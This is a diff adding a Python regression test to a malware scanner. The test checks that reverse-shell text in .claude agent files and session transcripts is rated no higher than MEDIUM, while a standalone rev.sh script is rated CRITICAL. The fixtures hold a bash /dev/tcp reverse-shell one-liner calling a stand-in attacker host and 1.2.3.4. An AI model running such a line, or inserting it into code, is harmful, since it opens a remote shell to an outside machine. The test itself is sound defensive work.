@@ -175,3 +175,23 @@ def test_scan_paths_batches_pause_between_chunks(tmp_path, scanner, monkeypatch)
     assert summary.completed and summary.files == 5
     # 5 arquivos com lote de 2 -> pausa após o 2º e após o 4º
     assert sleeps == [0.05, 0.05]
+
+
+def test_texto_que_descreve_ataque_nao_passa_de_medium(tmp_path, scanner):
+    """Regressão: agentes .md e transcrições .jsonl em ~/.claude davam CRITICAL/HIGH."""
+    import json
+
+    agentes = tmp_path / ".claude" / "agents"
+    agentes.mkdir(parents=True)
+    (agentes / "pentest.md").write_text(
+        "# Agente\n\n```bash\nbash -i >& /dev/tcp/attacker/4444 0>&1\n```\n")
+    sessao = tmp_path / ".claude" / "projects" / "p" / "s.jsonl"
+    sessao.parent.mkdir(parents=True)
+    sessao.write_text(json.dumps({"text": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1 e bitcoin, decrypt, .onion"}) + "\n")
+    (tmp_path / "rev.sh").write_text("#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")
+
+    _, findings, _ = run([tmp_path], scanner)
+    sev = {f.path.name: f.severity for f in findings}
+    assert sev["rev.sh"] == Severity.CRITICAL
+    assert sev["pentest.md"] <= Severity.MEDIUM
+    assert sev["s.jsonl"] <= Severity.MEDIUM
